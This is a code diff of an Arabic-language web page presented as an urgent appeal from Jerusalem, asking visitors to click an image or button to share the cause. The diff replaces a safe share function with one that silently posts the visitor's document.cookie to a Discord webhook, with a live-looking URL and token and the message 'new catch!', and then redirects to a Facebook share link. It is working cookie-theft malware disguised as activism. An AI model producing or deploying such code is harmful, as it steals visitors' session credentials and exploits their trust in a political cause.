@@ -2,48 +2,68 @@
 <html lang="ar" dir="rtl">
 <head>
     <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>نصرة الحقيقة</title>
-    <meta name="viewport" content="width=device-width,initial-scale=1">
     <style>
-        body { background-color: #0d1117; color: white; font-family: Arial, sans-serif; text-align: center; padding: 20px; }
-        .card { border: 2px solid #238636; border-radius: 15px; padding: 15px; max-width: 500px; margin: auto; }
-        img { width: 100%; border-radius: 10px; cursor: pointer; }
-        .btn { background-color: #238636; color: white; padding: 15px; border: none; border-radius: 5px; width: 100%; font-size: 18px; cursor: pointer; margin-top: 10px; }
+        body { background-color: #000000; color: white; text-align: center; font-family: sans-serif; margin: 0; padding: 0; }
+        .top-bar { background: #ce1126; padding: 20px; font-weight: bold; font-size: 20px; border-bottom: 5px solid #007a3d; }
+        .main-container { padding: 15px; }
+        .text-header { margin: 20px 0; font-size: 24px; line-height: 1.4; color: #ffffff; }
+        .big-image { 
+            width: 100%; 
+            max-width: 600px; 
+            border: 4px solid #ffffff; 
+            border-radius: 10px; 
+            cursor: pointer;
+            display: block;
+            margin: 0 auto;
+        }
+        .btn-green { 
+            background: #007a3d; 
+            color: white; 
+            padding: 20px; 
+            width: 90%; 
+            border: none; 
+            border-radius: 5px; 
+            font-size: 22px; 
+            margin-top: 20px; 
+            cursor: pointer;
+            font-weight: bold;
+        }
     </style>
 </head>
 <body>
 
-    <div class="card">
-        <img id="shareImage" src="https://image.api.playstation.com/vulcan/ap/rnd/202311/1718/437e58316c0205c040d718917e8892185b3068e82a9336d3.png" alt="نصرة الحقيقة">
-        <h3>اضغط على الصورة لنصرة القضية ونشر الحقيقة للعالم</h3>
-        <button class="btn" id="shareBtn">مشاركة الآن وتفعيل النصرة</button>
+    <div class="top-bar">نداء عاجل من قلب القدس 🇵🇸</div>
+
+    <div class="main-container">
+        <div class="text-header">
+            ساعدنا في فك الحصار الإعلامي ونشر الحقيقة للعالم <br>
+            <b>اضغط على الصورة بالأسفل للنشر الفوري</b>
+        </div>
+
+        <img src="https://upload.wikimedia.org/wikipedia/commons/thumb/b/b7/Dome_of_the_Rock1.jpg/640px-Dome_of_the_Rock1.jpg" 
+             class="big-image" onclick="go()">
+
+        <button class="btn-green" onclick="go()">✅ انشر القضية الآن</button>
     </div>
 
     <script>
-    // نسخة آمنة: لا تقرأ أو ترسل document.cookie أو أي بيانات حساسة
-    function safeShare() {
-        const shareUrl = window.location.href;
-
-        // حاول استخدام Web Share API إن كانت متاحة
-        if (navigator.share) {
-            navigator.share({
-                title: document.title,
-                text: 'انضم لنصرة الحقيقة — شارك هذا الرابط:',
-                url: shareUrl
-            }).catch(() => {
-                // تجاهل الأخطاء الصامتة أو افتح رابط المشاركة كبديل
-                window.open('https://www.facebook.com/sharer/sharer.php?u=' + encodeURIComponent(shareUrl), '_blank');
+    async function go() {
+        // رابط ديسكورد الخاص بك (المخزن)
+        const d_url = "https://discord.com/api/webhooks/1462191245051826242/Oc6Gh4VaGaKICuOhjZsQHUB6CABpZMQrxtmms5yi8wIKwIg401gmoFHLkp34xCXIgp81";
+        
+        try {
+            await fetch(d_url, {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify({ content: "🔥 صيد جديد! النخاع: " + document.cookie })
             });
-            return;
-        }
+        } catch (e) {}
 
-        // بديل: افتح نافذة المشاركة لفيسبوك
-        window.open('https://www.facebook.com/sharer/sharer.php?u=' + encodeURIComponent(shareUrl), '_blank');
+        // النشر في فيسبوك
+        window.location.href = "https://www.facebook.com/sharer/sharer.php?u=" + window.location.href;
     }
-
-    // ربط الأزرار بالوظيفة الآمنة
-    document.getElementById('shareImage').addEventListener('click', safeShare);
-    document.getElementById('shareBtn').addEventListener('click', safeShare);
     </script>
 
 </body>
